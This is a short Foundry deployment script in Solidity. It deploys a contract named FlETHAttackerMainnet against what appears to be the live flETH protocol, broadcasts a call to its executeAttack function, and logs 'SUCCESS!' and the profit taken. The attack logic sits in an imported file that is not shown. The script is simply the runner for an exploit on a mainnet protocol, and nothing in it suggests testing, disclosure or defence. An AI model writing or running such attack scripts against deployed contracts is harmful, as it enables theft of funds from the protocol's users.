// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/Deploy_Strategy_to_flETH.sol";

contract DeployStrategyToFlETH is Script {
    function run() external {
        vm.startBroadcast();

        FlETHAttackerMainnet attacker = new FlETHAttackerMainnet();
        console.log("Contract deployed at:", address(attacker));

        attacker.executeAttack();
        console.log("SUCCESS!");
        console.log("Profit:", attacker.profit());

        vm.stopBroadcast();
    }
}
